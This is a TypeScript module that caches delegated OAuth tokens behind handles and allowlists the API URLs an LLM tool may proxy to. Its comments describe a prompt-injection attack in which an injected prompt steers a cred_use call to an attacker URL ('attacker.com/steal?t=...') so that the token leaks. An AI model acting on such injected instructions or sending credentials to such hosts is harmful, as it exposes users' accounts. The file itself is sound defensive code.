/**
 * TokenCache — in-process store for short-lived delegation tokens.
 *
 * Tokens are stored here so the LLM never sees the raw access_token.
 * cred_delegate returns a handle (del_xxxx); cred_use exchanges it here
 * and makes the upstream API call on the LLM's behalf.
 *
 * SSRF protection: isAllowedUrl() validates the target URL against a
 * per-service allowlist so an injected prompt can't redirect the token
 * to an attacker-controlled server.
 */

import crypto from 'crypto';

export interface TokenEntry {
  accessToken: string;
  service: string;
  userId: string;
  expiresAt: number; // Unix ms
}

/**
 * Known safe API base URLs per service.
 * cred_use refuses to proxy requests to any URL not on this list.
 */
const SERVICE_ALLOWLIST: Record<string, string[]> = {
  google: [
    'https://www.googleapis.com/',
    'https://gmail.googleapis.com/',
    'https://calendar.googleapis.com/',
    'https://drive.googleapis.com/',
    'https://sheets.googleapis.com/',
    'https://docs.googleapis.com/',
    'https://admin.googleapis.com/',
    'https://people.googleapis.com/',
  ],
  github: [
    'https://api.github.com/',
  ],
  slack: [
    'https://slack.com/api/',
  ],
  notion: [
    'https://api.notion.com/',
  ],
  // Salesforce instance URLs vary per org (e.g. mycompany.salesforce.com)
  // We allow any HTTPS *.salesforce.com or *.force.com origin
  salesforce: [],
};

export class TokenCache {
  private readonly entries = new Map<string, TokenEntry>();
  private cleanupTimer?: ReturnType<typeof setInterval>;

  constructor() {
    // Periodic sweep for expired entries (belt-and-suspenders on top of per-entry timeouts)
    this.cleanupTimer = setInterval(() => this.sweep(), 60_000);
    if (this.cleanupTimer?.unref) this.cleanupTimer.unref();
  }

  /** Store a token and return a delegation handle */
  store(entry: TokenEntry): string {
    const id = `del_${crypto.randomBytes(10).toString('hex')}`;
    this.entries.set(id, { ...entry });

    const ttl = entry.expiresAt - Date.now();
    if (ttl > 0) {
      const t = setTimeout(() => this.entries.delete(id), ttl);
      if (t?.unref) t.unref();
    }

    return id;
  }

  /** Look up a handle. Returns a copy — callers cannot mutate the stored entry. */
  get(id: string): TokenEntry | undefined {
    const entry = this.entries.get(id);
    if (!entry) return undefined;
    if (Date.now() >= entry.expiresAt) {
      this.entries.delete(id);
      return undefined;
    }
    return { ...entry };
  }

  /** Revoke a handle early (e.g. after cred_revoke) */
  delete(id: string): boolean {
    return this.entries.delete(id);
  }

  /**
   * Validate that a URL is safe to proxy for the given service.
   *
   * Prevents SSRF: without this check, an injected prompt could craft a
   * cred_use call with url="https://attacker.com/steal?t=..." and the
   * cached token would be sent in the Authorization header.
   */
  isAllowedUrl(service: string, url: string): boolean {
    // Hard require HTTPS — no exceptions
    if (!url.startsWith('https://')) return false;

    if (service === 'salesforce') {
      // Salesforce: allow *.salesforce.com and *.force.com only
      try {
        const { hostname } = new URL(url);
        return hostname.endsWith('.salesforce.com') || hostname.endsWith('.force.com');
      } catch {
        return false;
      }
    }

    const allowed = SERVICE_ALLOWLIST[service];
    if (!allowed) return false;

    return allowed.some(base => url.startsWith(base));
  }

  /** Remove all expired entries */
  private sweep(): void {
    const now = Date.now();
    for (const [id, entry] of this.entries) {
      if (now >= entry.expiresAt) this.entries.delete(id);
    }
  }

  destroy(): void {
    if (this.cleanupTimer) clearInterval(this.cleanupTimer);
  }
}
